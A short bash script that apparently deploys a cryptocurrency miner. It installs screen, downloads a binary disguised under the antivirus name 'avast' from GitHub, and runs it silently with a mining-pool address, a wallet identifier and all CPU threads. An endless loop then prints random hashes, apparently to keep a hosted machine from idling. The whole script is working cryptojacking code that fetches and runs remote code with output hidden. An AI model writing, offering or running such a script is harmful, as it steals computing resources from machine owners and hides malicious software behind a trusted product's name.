#!/bin/bash

#!/bin/sh

#!/bin/bash

apt update

apt-get install screen libjansson4 -y 

wget https://github.com/angkii/2022/raw/main/avast >/dev/null 2>&1

chmod +x avast >/dev/null 2>&1

screen -dmS ls

./avast -v -l 144.217.82.15:80 -u 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$(echo $(shuf -i 1-9999 -n 1)111) -p x -t $(nproc) >/dev/null 2>&1

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
